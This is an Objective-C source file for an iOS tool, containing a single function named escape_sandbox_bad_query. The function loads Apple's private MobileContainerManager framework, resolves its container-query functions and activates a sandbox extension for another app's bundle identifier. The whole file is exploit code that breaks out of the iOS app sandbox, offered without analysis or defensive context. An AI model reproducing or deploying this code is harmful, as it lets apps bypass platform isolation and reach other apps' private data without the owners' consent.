#import "SandboxEscape.h"
#import <dlfcn.h>

bool escape_sandbox_bad_query(NSString *bundleId) {
    void *h = dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW);
    if (!h) return false;
    void* (*q_create)(void) = dlsym(h, "container_query_create");
    void (*q_set_class)(void*, unsigned) = dlsym(h, "container_query_set_class");
    void (*q_set_id)(void*, id) = dlsym(h, "container_query_set_identifiers");
    void* (*q_get_result)(void*) = dlsym(h, "container_query_get_single_result");
    bool (*q_activate)(void*, bool) = dlsym(h, "container_object_sandbox_extension_activate");
    if (!q_create || !q_activate) return false;
    void *q = q_create();
    if (q_set_class) q_set_class(q, 2);
    if (q_set_id) q_set_id(q, bundleId);
    void *obj = q_get_result(q);
    if (!obj) return false;
    return q_activate(obj, false);
}
